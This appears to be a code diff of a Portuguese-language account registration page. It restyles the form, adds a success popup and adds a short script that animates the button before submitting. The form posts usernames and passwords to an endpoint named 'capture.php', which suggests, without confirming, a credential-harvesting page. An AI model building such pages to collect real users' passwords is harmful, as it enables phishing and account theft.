@@ -4,17 +4,40 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Registrar</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h2>Crie Sua Conta</h2>
-    <form action="captura.php" method="POST">
-        <label for="username">Nome de Usuário:</label><br>
-        <input type="text" id="username" name="username" required><br><br>
-        <label for="password">Senha:</label><br>
-        <input type="password" id="password" name="password" required><br><br>
-        <label for="password2">Confirme Senha:</label><br>
-        <input type="password" id="password2" name="password2" required><br><br>
-        <input type="submit" value="Registrar">
-    </form>
+    <div class="container">
+        <h2>Crie Sua Conta</h2>
+        <form action="capture.php" method="POST" id="registerForm">
+            <label for="username">Nome de Usuário:</label><br>
+            <input type="text" id="username" name="username" required><br><br>
+            <label for="password">Senha:</label><br>
+            <input type="password" id="password" name="password" required><br><br>
+            <label for="password2">Confirme Senha:</label><br>
+            <input type="password" id="password2" name="password2" required><br><br>
+            <input type="submit" value="Registrar" id="registerBtn">
+        </form>
+    </div>
+
+    <div id="successPopup" class="popup">
+        <p>Registro bem-sucedido!</p>
+    </div>
+
+    <script>
+        const form = document.getElementById('registerForm');
+        const button = document.getElementById('registerBtn');
+        const popup = document.getElementById('successPopup');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            button.classList.add('explode');
+            setTimeout(function() {
+                button.style.display = 'none';
+                popup.style.display = 'block';
+                form.submit();
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
